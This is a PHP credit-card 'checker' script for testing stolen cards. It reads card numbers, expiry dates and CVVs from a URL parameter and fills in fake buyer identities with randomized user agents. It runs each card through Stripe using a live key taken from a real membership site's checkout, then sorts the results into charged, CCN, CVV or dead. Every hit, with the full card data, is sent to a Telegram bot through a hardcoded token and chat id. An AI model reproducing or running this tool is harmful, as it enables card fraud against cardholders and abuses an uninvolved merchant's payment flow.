<?php

ob_start();

#---///[Credits]\\\---#

$credits = "[ 𝗔𝗺𝗮𝗮𝗻 🇰🇼 ]";

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

#---///[START]\\\---#

if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  return explode($end, $str[1])[0];
}

function Gen_Randi_U_A()
{
  $platforms = ['Windows NT', 'Macintosh', 'Linux', 'Android', 'iOS'];
  $browsers = ['Mozilla', 'Chrome', 'Opera', 'Safari', 'Edge', 'Firefox'];
  $platform = $platforms[array_rand($platforms)];
  $version = rand(11, 99) . '.' . rand(11, 99);
  $browser = $browsers[array_rand($browsers)];
  $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
  return "$browser/5.0 ($platform " . rand(11, 99) . ".0; Win64; x64) AppleWebKit/$version (KHTML, like Gecko) $browser/$version.$chromeVersion Safari/$version." . rand(11, 99);
}

function Make_Request($url, $method = 'GET', $headers = [], $data = null)
{
  $ch = curl_init();
  $options = [
    CURLOPT_URL => $url,
    CURLOPT_HEADER => 0,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_COOKIEFILE => 'cookie.txt',
    CURLOPT_COOKIEJAR => 'cookie.txt',
    ];

if ($method === 'POST' || $method === 'PUT' || $method === 'PATCH') {
$options[CURLOPT_POSTFIELDS] = $data;
}

curl_setopt_array($ch, $options);
$result = curl_exec($ch);
$time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

return [$result, $time];
}

$bt = '7346758158:AAGcbEptj5EsgnFGrTXF81ycCuQ_eje5GtY';
$idd = '-1002242325790';

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

if (empty($lista)) {
echo 'Status: #Error ⚠<br>
Response: 『 ★ Bete Enter Your CC First ★ 』<br>
Checker Made By: '.$credits.'<br><br>';
die();
}

$names = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez'];
$company_Names = ['BinBhaiFamily', 'TechSolutions', 'InnovateHub', 'EpicTech', 'CodeMasters', 'WebWizards', 'DataGenius', 'SmartTech', 'QuantumSystems', 'DigitalCrafters'];
$streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln', 'Elm St', 'Springfield Dr', 'Highland Ave', 'Meadow Ln', 'Sunset Blvd'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
$phones = ['682', '346', '246'];
$state_data = [
    'NY' => 'New York',
    'CA' => 'California',
    'TX' => 'Texas',
    'FL' => 'Florida',
    'PA' => 'Pennsylvania',
    'IL' => 'Illinois',
    'OH' => 'Ohio',
    'GA' => 'Georgia',
    'NC' => 'North Carolina',
    'MI' => 'Michigan'
];
$zips = [
    'NY' => '10001',
    'CA' => '90001',
    'TX' => '75001',
    'FL' => '33101',
    'PA' => '19101',
    'IL' => '60601',
    'OH' => '44101',
    'GA' => '30301',
    'NC' => '28201',
    'MI' => '48201'
];

$name = ucfirst($names[array_rand($names)]);
$last = ucfirst($last_names[array_rand($last_names)]);
$com = ucfirst($company_Names[array_rand($company_Names)]);
$street = rand(100, 9999) . ' ' . $streets[array_rand($streets)];
$city = $cities[array_rand($cities)];
$state_code = array_rand($state_data);
$state = $state_data[$state_code];
$zip = $zips[$state_code];
$phone = $phones[array_rand($phones)] . rand(1000000, 9999999);
$mail = strtolower($name) . '.' . strtolower($last) . rand(0000, 9999) . '@gmail.com';
$username = strtolower($name) . '.' . strtolower($last) . rand(0000, 9999);


#.............................. 1 req ..................................

$firsturl = 'https://api.stripe.com/v1/payment_methods';

$headers1 = [
  'content-type: application/x-www-form-urlencoded',
  'user-agent: '.Gen_Randi_U_A().'',

];

$data1 = 'type=card&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state_code.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=714783c6-cbed-4d35-8415-8c6198e6bf866f2d75&muid=aa3a3478-f120-47d2-b5ae-feba66848b1ef2ff11&sid=85148f71-4470-42fb-bede-4bea31fb1a880dc9c7&pasted_fields=number&payment_user_agent=stripe.js%2F6467d473fa%3B+stripe-js-v3%2F6467d473fa%3B+split-card-element&referrer=https%3A%2F%2Famralive.com&time_on_page=30164&key=pk_live_WafveUvMcUoY2W8xx3mYSBxR';

list($result1,$time1) = Make_Request($firsturl, 'POST', $headers1, $data1);

$id = GetStr($result1, '"id": "','"');
$l4 = GetStr($result1, '"last4": "','"');

#................................... 2 req .................................

$secondurl = 'https://amralive.com/membership-account/membership-checkout/';

$headers = [
  'content-type: application/x-www-form-urlencoded',
  'user-agent: '.Gen_Randi_U_A().'',
];

$data = 'level=1&checkjavascript=1&username='.$username.'&password='.$name.'12345&password2='.$name.'12345&bemail='.$mail.'&bconfirmemail='.$mail.'&fullname=&bfirstname='.$name.'&blastname='.$last.'&baddress1='.$street.'&baddress2=&bcity='.$city.'&bstate='.$state_code.'&bzipcode='.$zip.'&bcountry=US&bphone='.$phone.'&CardType=visa&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$l4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'';

list($result,$time2) = Make_Request($secondurl, 'POST', $headers, $data);

$Respo = GetStr($result, '<div id="pmpro_message" class="pmpro_message pmpro_error">','</div>');

$time = number_format(($time0 + $time1 + $time2), 1);


    #########################[BIN LOOK-UP]############################

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc . '');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: lookup.binlist.net',
    'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
  ));
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '');
  $fim = curl_exec($ch);
  $emoji = GetStr($fim, '"emoji":"', '"');
  if (strpos($fim, '"type":"credit"') !== false) {
  }
  curl_close($ch);

  #########################

  $ch = curl_init();
  $bin = substr($cc, 0, 6);
  curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  $bindata = curl_exec($ch);
  $binna = json_decode($bindata, true);
  $brand = $binna['scheme'];
  $country = $binna['country']['name'];
  $type = $binna['type'];
  $bank = $binna['bank']['name'];
  curl_close($ch);

  $bindata1 = " $type - $brand - $country $emoji"; 

  $get = file_get_contents('https://randomuser.me/api/1.3/?nat=' . $country . '');
  preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
  $first = $matches1[1][0];
  preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
  $last = $matches1[1][0];
  preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
  $email = $matches1[1][0];
  $serve_arr = array("gmail.com", "homtail.com", "yahoo.com.br", "outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email = str_replace("example.com", $serv_rnd, $email);
  preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
  $street = $matches1[1][0];
  preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
  $city = $matches1[1][0];
  preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
  $state = $matches1[1][0];
  preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
  $phone = $matches1[1][0];
  preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
  $postcode = $matches1[1][0];
  preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
  $zip = $matches1[1][0];
                

//-----[CVV [Charged] Response]-----
if ((strpos($result, '"result":"success"') !== false) || 
    (strpos($result, '"Thank you. Your order has been received."') !== false) || 
    (strpos($result, '"success"') !== false) || 
    (strpos($result, 'APPROVED') !== false) || 
    (strpos($result, 'SUCCEEDED') !== false)) {
echo '<span style="color: green; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» #Charged ⚠<br>
» CC : '.$lista.'<br>
» RESPONSE : #APPROVED [ Payment Successful ✅ ]<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Time Taken : '.$time.'s<br>
» Owner : '.$credits.'<br>
<br></span>';
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➔ <code>{$lista}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ❎
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
return;
}

//-----[CCN LIVE Response]-----
if ((strpos($result, 'Invalid account.') !== false) || (strpos($result, 'Invalid account.') !== false) || (strpos($result, 'account_Invalid') !== false) || (strpos($result, 'Invalid account.') !== false) || (strpos($result, '"Invalid account": "fail"') !== false)) {
echo '<span style="color: pink; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» CCN 🌿<br>
» CCN : '.$lista.'<br>
» RESPONSE : [ Invalid account ]<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Time Taken : '.$time.'s<br>
» Owner : '.$credits.'<br>
<br></span>';
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗖𝗡 : <code>{$lista}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ Invalid account
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
return;
}

//-----[CCN LIVE Response]-----
if ((strpos($result, 'security code is incorrect.') !== false) || (strpos($result, 'Your card&#039;s security code is incorrect.') !== false) || (strpos($result, 'incorrect_cvc') !== false) || (strpos($result, 'security code is invalid.') !== false) || (strpos($result, '"cvc_check": "fail"') !== false)) {
echo '<span style="color: pink; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» CCN 🌿<br>
» CC : '.$lista.'<br>
» RESPONSE : [Your card\'s security code is invalid]<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Time Taken : '.$time.'s<br>
» Owner : '.$credits.'<br>
<br></span>';
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗖𝗡 : <code>{$lista}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ invalid security code
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
return;
}

//-----[CVV [Matched] Response]-----
if (
    (strpos($result, '"cvc_check": "pass"') !== false) ||  // CVV check passed
    (strpos($result, 'Your card zip code is incorrect.') !== false) || // Zip code error
    (strpos($result, 'incorrect_zip') !== false) || // Zip code error (another variation)
    (strpos($result, '"type":"one-time"') !== false)  // One-time use card
){
    echo '<span style="color: light-blue; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» CVV ☘<br>
    » CVV : '.$lista.'<br>
    » RESPONSE : [Your card s security code is invalid]<br>
    » Gateway : Stripe<br>
    » Bank Info : ' .$country. ' | ' .$bank. '<br>
    » Time Taken : '.$time.'<br>  // Removed font-family here
    » Owner : '.$credits.'<br>
    <br></span>';

    $msg = <<<EOT
    ┏━━━━━━━⍟
    ┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
    ┗━━━━━━━━━━━⊛
    ⊛ 𝗖𝗩𝗩 : <code>{$lista}</code>
    ⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ incorrect security code
    ⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
    ⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

     ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
    EOT;
    $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) ); // Corrected string concatenation
    return;
}

//-----[CVV [Your card does not support this type of purchase.] Response]-----
if ((strpos($result, 'not support') !== false) || (strpos($result, 'Your card does not support this type of purchase.') !== false) || (strpos($result, 'card does not support') !== false) || (strpos($result, '"type":"one-time"') !== false)) {
echo '<span style="color: green; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» #APPROVED  [CVV] ✅<br>
» CC : '.$lista.'<br>
» RESPONSE : Approved $5<br>
» Risk Level : elevated<br>
<br>
» Bin Info Info : '.$type.' | '.$brand.'<br>
» Bank : '.$bank.'<br>
» Country : '.$country.'' .$emoji. '<br>
<br>
» Vbv : Rejected ❌<br>
» Gateway : Stripe<br>
» Owner : '.$credits.'<br>
<br></span>';
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗩𝗩 : <code>{$lista}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
return;
}

//-----[CVV/CCN [Insufficient Funds] Response]-----
if ((strpos($result, 'Insufficient funds') !== false) || (strpos($result, 'Your card has insufficient funds.') !== false) || (strpos($result, 'insufficient_funds') !== false)) {
echo '<span style="color: light-blue; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» CVV ☘<br>
» CC : '.$lista.'<br>
» RESPONSE : [Your card has insufficient funds]<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Time Taken : '.$time.'s<br>
» Owner : '.$credits.'<br>
<br></span>'; 
$msg = <<<EOT
┏━━━━━━━⍟
┃ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥
┗━━━━━━━━━━━⊛
⊛ 𝗖𝗩𝗩/𝗖𝗖𝗡  : <code>{$lista}</code>
⊛ 𝗥𝗘𝗦𝗣𝗢𝗡𝗖𝗘 ➔ insufficient funds
⊛ 𝗔𝗠𝗢𝗨𝗡𝗧 ➔ 5
⊛ 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬 ➔ 𝗔𝗺𝗮𝗮𝗻 🇰🇼

 ❛ ━━━━･⌁ 𝗛𝗜𝗧 𝗦𝗘𝗡𝗗𝗘𝗥 ⌁･━━━━ ❜
EOT;
   $apiToken = $bt;
    $logger = ['chat_id' => $idd,'text' => $msg,'parse_mode'=>'html' ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
return;
}

//-----[Declined Response]-----
elseif (strpos($result, $Respo) !== false) {
echo '<span style="color: red; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» #Dead ❌<br>
» CC : '.$lista.'<br>
» RESPONSE : ['.$Respo.']<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Time Taken : '.$time.'s<br>
» Owner : '.$credits.'<br>
<br></span>';
return;
}

// If none of the above conditions are met
else {
echo '<span style="color: yellow; font-size: 15px; font-weight: simple; font-family: Arial, sans-serif;">» #Error ⚠️<br>
» CC : '.$lista.'<br>
» Response :『 ★ Unknown Error Found | 3d Bin Error | Try Again or Contact To Host To Fix This..! @amaan_06 ⚡ ★ 』<br>
» Time Taken : '.$time.'s<br>
» Gateway : Stripe<br>
» Bank Info : ' .$country. ' | ' .$bank. '<br>
» Checker Made By : '.$credits.'<br>
<br></span>';
return;
}



#echo "<br><b>1:</b> $result1<br><br>";
#echo "<br><b>2:</b> $result<br><br>";
 
#echo "<br><b>RESPO:</b> $Respo<br><br>"; 
#echo "<br><b>id:</b> $id<br><br>"; 


ob_flush();
@unlink('cookie.txt');

sleep(1)
?>